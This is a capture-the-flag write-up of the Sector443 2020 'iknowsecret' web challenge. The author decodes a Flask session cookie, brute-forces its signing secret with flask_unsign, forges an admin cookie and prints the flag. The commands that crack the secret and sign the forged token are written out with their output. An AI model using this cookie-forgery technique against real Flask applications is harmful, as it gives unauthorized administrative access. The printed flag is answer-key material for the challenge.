# Sector443 CTF 2020: Web - iknowsecret (443 points)

![img](https://github.com/FreezeLuiz/CTF-Writeups/blob/master/Web/images/sector443/iknowsecret/iknowsecret-chall_description.PNG "Challenge Description")

The information from the challenge description is a lot! But we get 3 important things:

1. we have user accounts to login
2. we have the URL 
3. we need to be `admin`

>Sounds easy! Lets see...


## Recon and Analysis

I don't like dirbuster the website, because usually in CTF challenges thats not the intended route.

My first thought after logging in with `Alice`, is that _it has to be an `authentication token` challenge._

I looked at the cookies and there was a session cookie called `session` that had the value:

```
session = eyJ1c2VybmFtZSI6IkFsaWNlIn0.X4LFSQ.UIhkGLEypsn2egiwIXKNMoyJ0Pc
```

At first glance, it may look like a [JWT](https://jwt.io/) token. Looking at it closely, it doesn't have the same structure as a JWT.
```
JWT's Structure
---------------

Header . Payload . Signature


This Token's Structure
----------------------

Payload . ???? . ????

```

When we send login requests multiple times, we get a different session cookie every time. 

```
1st: eyJ1c2VybmFtZSI6IkFsaWNlIn0.X4LFSQ.UIhkGLEypsn2egiwIXKNMoyJ0Pc
2nd: eyJ1c2VybmFtZSI6IkFsaWNlIn0.X4LXxA.Jc7Djou7JXl_H4WTJpDaAPwk-E4
3rd: eyJ1c2VybmFtZSI6IkFsaWNlIn0.X4LX6A.L9EuQltdNTUfk-0n_SZHh8yWn3M
```
The two things in common in these cookies are: The first half which is the payload or the data of the user `{"username": "Alice"}` base64 encoded, and the second half which always starts with `X4L***`.


The next key element to solve this challenge is the server's response headers. 

![img](https://github.com/FreezeLuiz/CTF-Writeups/blob/master/Web/images/sector443/iknowsecret/iknowsecret-python_server_flask.PNG "Flask Server")

That `server` header indicates that its running [Flask](https://flask.palletsprojects.com/), a python web server. 


## Solution

After googling around a bit for flask authentication token, I found something called [flask_unsign](https://pypi.org/project/flask-unsign/) that can take a token and bruteforce its secret, then using that secret we can forge other flask authentication tokens. 

```
kali@kali:~/Documents/sector443/iknowsecret$ python3 /home/kali/.local/lib/python3.8/site-packages/flask_unsign/__main__.py -u -c eyJ1c2VybmFtZSI6IkFsaWNlIn0.X4LX_Q.LU2iFhRBcP2nRHMCpdDQ1FnJY4o
[*] Session decodes to: {'username': 'Alice'}
[*] No wordlist selected, falling back to default wordlist..
[*] Starting brute-forcer with 8 threads..
[*] Attempted (2560): -----BEGIN PRIVATE KEY-----eke
[+] Found secret key after 18048 attemptsxxxxxxxxxxxx
'xxxxxxxx'
```

>For some reason I wasn't able to get the program in my path, so I had to get a work around and use the main py script from the module itself...

We got the secret `xxxxxxxx`...

```
kali@kali:~/Documents/sector443/iknowsecret$ python3 /home/kali/.local/lib/python3.8/site-packages/flask_unsign/__main__.py --sign -c "{'username': 'admin'}" --secret 'xxxxxxxx' --legacy

eyJ1c2VybmFtZSI6ImFkbWluIn0.X4LfAw.G-znSjIPN3MlE92fEgvN2vVpMMA
```
`eyJ1c2VybmFtZSI6ImFkbWluIn0.X4LfAw.G-znSjIPN3MlE92fEgvN2vVpMMA` Is the admin token with a correct signature that will authenticate with the server.

After replacing the `session` cookie value with that new one, we will get the flag:

![img](https://github.com/FreezeLuiz/CTF-Writeups/blob/master/Web/images/sector443/iknowsecret/iknowsecret-flag.PNG "flag.. yay!")

Flag = `S443{D7WZDqWffsFwU99Z}`